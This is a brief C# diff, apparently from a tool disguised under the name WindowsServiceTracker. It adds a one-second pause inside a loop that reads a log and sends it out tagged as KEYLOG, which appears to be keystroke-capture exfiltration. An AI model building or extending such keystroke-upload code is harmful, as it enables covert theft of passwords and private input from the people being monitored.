@@ -592,6 +592,7 @@ namespace WindowsServiceTracker
                         bytesRead = log.Read(buffer, 0, readSize);
                         msg = Encoding.UTF8.GetBytes(buffer, 0, bytesRead);
                         lastSendSuccessful = SendStdMsg(KEYLOG, msg, true);
+                        Thread.Sleep(1000);
                     }
                     sentAllContent = lastSendSuccessful;
                 }
